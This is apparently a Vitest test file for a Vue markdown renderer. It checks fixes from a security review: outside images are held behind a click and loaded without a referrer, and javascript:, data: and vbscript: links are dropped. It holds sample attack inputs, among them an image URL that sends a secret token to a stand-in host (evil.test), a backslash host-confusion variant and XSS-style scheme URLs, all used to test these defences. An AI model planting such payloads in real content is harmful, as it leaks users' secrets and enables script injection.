import { mount } from '@vue/test-utils';
import { afterEach, describe, expect, it } from 'vitest';
import { nextTick } from 'vue';
import { OUTSIDE_IMAGES, outsideHost } from './images.ts';
import { parseInline } from './inline.ts';
import UiMarkdown from './UiMarkdown.vue';

afterEach(() => { document.body.innerHTML = ''; });

/** The exfiltration from the review (M4): an image whose URL carries data, which would load just by being read. */
const LEAK = '![chart](https://evil.test/p.png?d=secret-token)';

describe('outside images in markdown (M4)', () => {
  it('tells outside hosts from the hub and places in the app', () => {
    expect(outsideHost('https://evil.test/p.png', 'http://hub.test')).toBe('evil.test');
    expect(outsideHost('http://hub.test/content/a.png', 'http://hub.test')).toBeUndefined();
    expect(outsideHost('/content/a.png', 'http://hub.test')).toBeUndefined();
    expect(outsideHost('./a.png', 'http://hub.test')).toBeUndefined();
    // a relative form that names another host is judged by where the browser really loads from
    expect(outsideHost('/\\evil.test/p.png', 'http://hub.test')).toBe('evil.test');
  });

  it('never takes `/\\host` (which browsers read as `//host`) for a place in the app', () => {
    const md = mount(UiMarkdown, { props: { source: '![chart](/\\evil.test/p.png?d=secret-token) [x](/\\evil.test)' } });
    expect(md.find('img').exists()).toBe(false);
    expect(md.find('a').exists()).toBe(false);
    expect(md.html()).not.toContain('evil.test/p.png');
  });

  it('holds an outside image behind a click by default, then loads it with no referrer', async () => {
    const md = mount(UiMarkdown, { props: { source: LEAK }, attachTo: document.body });
    expect(md.find('img').exists()).toBe(false);
    const held = md.get('[data-testid="md-image-held"]');
    expect(held.text()).toContain('Load image from evil.test');
    expect(md.html()).not.toContain('src="https://evil.test');
    await held.trigger('click');
    await nextTick();
    const img = md.get('img');
    expect(img.attributes()).toMatchObject({ src: 'https://evil.test/p.png?d=secret-token', referrerpolicy: 'no-referrer' });
  });

  it('loads an outside image at once when the admin’s setting says always', () => {
    const md = mount(UiMarkdown, { props: { source: LEAK }, global: { provide: { [OUTSIDE_IMAGES]: () => 'always' } } });
    expect(md.find('[data-testid="md-image-held"]').exists()).toBe(false);
    expect(md.get('img').attributes()).toMatchObject({ src: 'https://evil.test/p.png?d=secret-token', referrerpolicy: 'no-referrer' });
  });

  it('loads images from the app at once', () => {
    const md = mount(UiMarkdown, { props: { source: `![a](/content/a.png) ![b](${window.location.origin}/b.png)` } });
    expect(md.findAll('img').map((img) => img.attributes('src'))).toEqual(['/content/a.png', `${window.location.origin}/b.png`]);
  });
});

describe('unsafe markdown URLs (H2)', () => {
  it('drops javascript:, data: and vbscript: links and images, keeping their text', () => {
    for (const url of ['javascript:alert(1)', 'JavaScript:alert(1)', 'data:text/html,x', 'vbscript:msgbox(1)', '//evil.test']) {
      expect(parseInline(`[click](${url})`)).toEqual([{ type: 'text', text: 'click' }]);
      expect(parseInline(`![pic](${url})`)).toEqual([{ type: 'text', text: 'pic' }]);
    }
    const md = mount(UiMarkdown, { props: { source: '[click](javascript:alert(1))' } });
    expect(md.find('a').exists()).toBe(false);
    expect(md.text()).toBe('click');
  });
});
